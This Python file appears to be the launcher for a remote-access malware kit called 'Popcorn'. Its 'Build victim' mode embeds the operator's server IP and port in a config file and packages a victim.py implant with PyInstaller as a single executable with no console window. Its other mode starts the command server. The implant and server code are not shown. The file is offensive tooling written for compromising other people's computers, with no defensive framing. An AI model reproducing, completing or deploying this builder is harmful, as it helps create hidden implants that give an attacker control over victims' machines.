import json
import os
import platform
import server


def clear_screen():
    if platform.system() == "Windows":
        command = "cls"
    else:
        command = "clear"
    os.system(command)


def build_victim():
    ip = input("Input server ip address: ")
    port = input("Input server opened port: ")
    base_path = os.path.dirname(os.path.abspath(__file__))
    data_path = os.path.join(base_path, "config.json")
    with open(data_path, "r") as file:
        data = json.load(file)
        data["Popcorn_Server_IP"] = ip
        data["Popcorn_Port"] = port
    with open(data_path, "w") as file:
        json.dump(data, file)
    if platform.system() == "Windows":
        command = "pyinstaller --onefile --noconsole --noconfirm --clean --add-data config.json;. victim.py"
    else:
        command = "pyinstaller --onefile --noconsole --noconfirm --clean --add-data config.json:. victim.py"
    os.system(command)
    print("Victim build complete")


def run_server():
    port = input("Input server opened port: ")
    base_path = os.path.dirname(os.path.abspath(__file__))
    data_path = os.path.join(base_path, 'config.json')
    with open(data_path, "r") as file:
        data = json.load(file)
        data["Popcorn_Port"] = port
    with open(data_path, "w") as file:
        json.dump(data, file)
    print("Starting server")
    clear_screen()
    server.main()


def main():
    base_path = os.path.dirname(os.path.abspath(__file__))
    data_path = os.path.join(base_path, "config.json")
    if not os.path.exists(data_path):
        data = {"Popcorn_Server_IP": "127.0.0.1", "Popcorn_Port": "7777"}
        with open(data_path, "w") as file:
            json.dump(data, file)
    clear_screen()
    print('''
Choose running mode:
1) Build victim
2) Run server
''')
    run_mode = input("Choose your option [1 or 2]: ")
    if run_mode == "1":
        build_victim()
    elif run_mode == "2":
        run_server()
    else:
        print("Invalid input")


if __name__ == '__main__':
    main()
